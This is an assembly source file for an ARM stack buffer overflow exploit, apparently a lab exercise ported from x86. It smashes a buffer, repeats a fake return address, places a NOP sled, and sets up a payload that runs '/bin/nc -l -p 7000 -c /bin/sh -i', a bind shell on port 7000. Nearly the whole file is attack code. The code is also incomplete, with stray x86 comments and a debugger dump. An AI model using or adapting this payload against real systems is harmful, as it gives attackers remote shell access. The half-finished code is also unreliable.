
.text


	
	                // we must export the entry point to the ELF linker or
    .global _start      // loader. They conventionally recognize _start as their
                        // entry point. Use ld -e foo to override the default.

// Jump to actual code in .data section. Actual code shouold be there since it 
// should be allocated with the data that are modified (args). Data cannot be in
// .text (.text is not modifiable) hence code should be in .data

	_start:
	
	ldr r0, =start_nops
	b r0

.data
// representation of the stack
buffer:	.space		16, 'A'		// dummy, it represent the buffer to smash


//       set this from outside using --defsym sym=value option of gnu as
//	.set	fakerp, 0xbffff670   // this is ok for debian sarge, both short and long argv[0]


		
	// we do not know exactly where the %eip is saved 
	// then we put here more than one copy
	// this is a fortunate situtation since the buffer is located very near
	// to the return address, no local variable is affected and hence
	// function finishing is granted

	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp
	.long		fakerp

	
// the data of the payload
data_start:	
	.align		4
	.ascii		"arg>"		// 4 bytes keep allignement
	
p0:	.asciz		"/bin/nc"          // executable to launch with parameters...
p1:	.asciz		"-l"               // listen mode
p2:	.asciz          "-p"		   // port
p3:	.asciz          "7000"		   //   6000
p4:	.asciz          "-c"               // command to execute when connected:	
p5:	.ascii          "/bin/sh"	   //   a shell
p5b:	.asciz		"!-i"              //  "!" will be translated into a space


args:	//arguments array
pp0:	.long		0
pp1:	.long		0
pp2:	.long		0
pp3:	.long		0
pp4:	.long		0
pp5:	.long		0
pp6:	.long		0

	.ascii		"env>"
env:	.long		0                  // no envinoment 

	
	        

	.ascii		"nops_nops_nops_nops>"
	.align		4


// the code of the payload
	
start_nops:
//  .space		923, 0x90		// 0x90 is opcode of NOP
        .rept   64
        .long   0xe1a00000
        .endr
        
        b self

lbladdrr2:
        .long  addrr2-self8
lblp0:
        .long  p0-self8

// execute the /bin/sh
	
	// get the address of the pop instruction
//	call self
self:
//	pop %ebp
  mov r4, pc
  nop
self8:
  nop

  // adjust instruction with 0x20 (ldr r2, =env)
//  mov r7, #lbladdrr2
  ldr r7, lbladdrr2
  mov r0, #addrr2
  add r7, r4, r7
addrr2:
  nop
//	ldr r0, #(env-self8)
	.ascii "<int"
	.ascii "\n"	//scanf now recognize the end of the field!

// 0x000000007efff8b0:  01 00 00 EA    b   #0x7efff8bc
// 0x000000007efff8b4:  00 00 A0 E1    mov r0, r0
// 0x000000007efff8b8:  00 00 A0 E1    mov r0, r0
// 0x000000007efff8bc:  0F 40 A0 E1    mov r4, pc
// 0x000000007efff8c0:  00 00 A0 E1    mov r0, r0
// 0x000000007efff8c4:  00 00 A0 E1    mov r0, r0
// 0x000000007efff8c8:  69 7F A0 E3    mov r7, #0x1a4
// 0x000000007efff8cc:  71 0F A0 E3    mov r0, #0x1c4
// 0x000000007efff8d0:  07 70 84 E0    add r7, r4, r7
// 0x000000007efff8d4:  00 00 A0 E1    mov r0, r0


